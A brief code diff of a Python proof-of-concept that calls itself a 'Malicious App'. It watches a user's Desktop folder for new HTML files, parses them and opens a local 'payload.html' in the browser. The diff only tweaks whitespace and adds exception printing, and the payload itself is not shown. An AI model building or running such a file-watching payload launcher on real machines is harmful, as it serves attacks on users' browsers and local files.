@@ -18,7 +18,7 @@ def WriteFile(path, content):
     k.close()
 
 class Event(LoggingEventHandler):
-    def dispatch(self, event):
+    def dispatch(self, event): 
         if not event.is_directory and event.src_path.split(".")[-1] in ["html"] and event.event_type=='created':
             soup = BeautifulSoup(ReadFile(event.src_path, True),'lxml')
             print("Malicious App Looking for new files in download folder.....")
@@ -34,6 +34,7 @@ class Event(LoggingEventHandler):
                 webbrowser.open("file://"+os.getcwd()+'/payload.html')
                 print("New file detected..."+str(event.src_path))
             except Exception as e:
+                print(str(e))
                 pass
 
 path = '/Users/rohitcoder/Desktop'
